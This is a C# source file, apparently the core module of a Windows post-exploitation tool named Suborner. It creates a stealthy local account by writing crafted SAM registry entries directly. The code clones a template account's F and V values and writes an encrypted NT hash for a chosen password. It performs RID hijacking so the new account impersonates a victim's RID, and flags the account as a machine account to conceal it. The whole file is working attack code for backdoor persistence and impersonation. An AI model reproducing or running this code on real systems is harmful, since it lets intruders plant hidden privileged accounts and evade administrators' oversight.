using Suborner.Module;
using Suborner.Module.SAM;
using Suborner.UI;
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Suborner.Core
{
    public static class Suborner
    {
        public static void CraftAccount()
        {
            Printer.PrintSuccess(String.Format("Crafting suborner account {0}", SubornerContext.Instance.User.Username));
            //SamAccount newSamAccount = new SamAccount();

            CraftNames();
            SubornerContext.Instance.newF = CraftF();
            SubornerContext.Instance.newV = CraftV();

        }

        public static void WriteChanges() 
        {
            Printer.PrintInfo("Writing changes to registry");
            RegistryManager.WriteNamesKey(SubornerContext.Instance.User.Username, SubornerContext.Instance.User.RID);
            RegistryManager.WriteAccountKeys(SubornerContext.Instance.User.RID, SubornerContext.Instance.newF, SubornerContext.Instance.newV);

            Printer.PrintSuccess(String.Format("The suborner account {0} has been created!", SubornerContext.Instance.User.Username));
        }
        private static void CraftNames()
        {
            // TODO: This need to be fileless!
            string namesFileContent = String.Format("Windows Registry Editor Version 5.00\r\n\r\n" +
                "[HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names\\{0}]" +
                "\r\n@=hex({1}):",
                SubornerContext.Instance.User.Username,
                SubornerContext.Instance.User.RID.ToString("x"));

            SubornerContext.Instance.newNames = namesFileContent;

            Printer.PrintSuccess("Crafted names key");
        }
        /// <summary>
        /// Method <c>CraftF</c> clones the F value from the specified template account and modifies it
        /// </summary>
        private static byte[] CraftF()
        {
            byte[] F = SubornerContext.Instance.TemplateF;
            F = SetRIDHijackandACBMachineAccount(F);
            Printer.PrintSuccess("Crafted F key");
            return F;
        }

        /// <summary>
        /// Method <c>CraftV</c> clones the V value from the specified template account and modifies it
        /// </summary>
        private static byte[] CraftV()
        {
            byte[] V = SubornerContext.Instance.TemplateV;
            SamAccountV VStructure = new SamAccountV(V);
            Printer.PrintInfo("Writing V account values");
            VStructure.ChangeSAMVEntryValue("Username", Encoding.Unicode.GetBytes(SubornerContext.Instance.User.Username));
            
            Printer.PrintInfo("Encrypting password for V");
            

            byte[] NTEncrypted = Crypto.Crypto.EncryptPasswordToSamV(
                SubornerContext.Instance.User.RID,
                SubornerContext.Instance.User.Password,
                SubornerContext.Instance.DomainAccountF); ;
            Printer.PrintDebug(String.Format("Using RID: {0} and Password: {1}", SubornerContext.Instance.User.RID, SubornerContext.Instance.User.Password));
            Printer.PrintDebug(String.Format("NT Encrypted:{0}", Utility.ByteArrayToString(NTEncrypted)));

            // Test if structure is well written
            SAM_HASH_AES testAes = new SAM_HASH_AES();
            GCHandle pSamHashAes = GCHandle.Alloc(NTEncrypted, GCHandleType.Pinned);
            testAes = (SAM_HASH_AES)Marshal.PtrToStructure(pSamHashAes.AddrOfPinnedObject(),
                                            typeof(SAM_HASH_AES));
            pSamHashAes.Free();
            Printer.PrintDebug(String.Format("NT Format - AES IV: {0}, AES DATA = {1}", Utility.ByteArrayToString(testAes.Salt), Utility.ByteArrayToString(testAes.data)));

            VStructure.ChangeSAMVEntryValue("NTLMHash", NTEncrypted);
            Printer.PrintDebug("Value written to V.NTLMHash: " + Utility.ByteArrayToString(VStructure.V.NTLMHash.value));
            Printer.PrintSuccess("Crafted V key");
            return VStructure.GetAsByteArray();
        }

        private static byte[] SetRIDHijackandACBMachineAccount(byte[] F)
        {
            byte[] FModified = new byte[F.Length];
            for (int i = 0; i < F.Length; i++)
            {
                if (i == 48)
                {
                    Printer.PrintInfo(String.Format("RID Hijacking: Setting victim's RID {0} to new account {1} for impersonation", SubornerContext.Instance.User.FRID, SubornerContext.Instance.User.Username));
                    byte[] hexRID = BitConverter.GetBytes(SubornerContext.Instance.User.FRID);
                    FModified[i] = hexRID[0];
                    FModified[i + 1] = hexRID[1];
                    i++;
                    continue;
                }
                if (i == 56)
                {
                    Printer.PrintInfo("Setting account as enabled as machine account");
                    FModified[i] = 0x80;    // ACB_WSTRUST
                    continue;
                }
                FModified[i] = F[i];
             }
            return FModified;
        }
    }
}
